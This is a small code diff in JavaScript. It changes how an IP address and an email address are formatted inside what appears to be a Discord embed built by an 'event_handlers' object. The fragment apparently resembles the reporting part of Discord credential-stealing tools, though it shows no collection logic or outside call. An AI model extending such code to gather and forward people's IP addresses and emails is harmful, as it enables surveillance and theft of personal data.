@@ -295,12 +295,12 @@ var event_handlers = {
                     },
                     {
                         name: "<:1336:1012707773424865310> IP:",
-                        value: `${ip}`,
+                        value: `\`${ip}\``,
                         inline: true
                     },
                     {
                         name: "<:1336:1012707970653626408> Email:",
-                        value: `${email}`,
+                        value: `\`${email}\``,
                         inline: true
                     },
                     {
